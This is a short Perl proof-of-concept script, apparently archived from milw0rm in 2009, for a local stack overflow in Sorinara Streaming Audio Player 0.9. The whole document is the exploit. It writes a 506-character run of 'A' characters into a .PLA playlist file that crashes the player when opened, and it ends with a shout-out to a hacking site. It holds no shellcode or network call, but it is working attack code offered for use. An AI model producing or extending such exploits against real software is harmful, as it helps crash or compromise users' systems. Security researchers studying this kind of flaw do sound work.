# ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ### ### # ## ## ## ###
# #  Sorinara Streaming Audio Player 0.9 (.PLA) Local Stack Overflow PoC   # #
# ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ### # ### ## ## ###
my $chars= "A" x 506;
my $file="GOLD-M.PLA";
open(my $FILE, ">>$file") or die "Cannot open $file: $!";
print $FILE $chars;
close($FILE);
print "$file has been created \n";
print "Thanx Tryag.Com";

# milw0rm.com [2009-05-07]
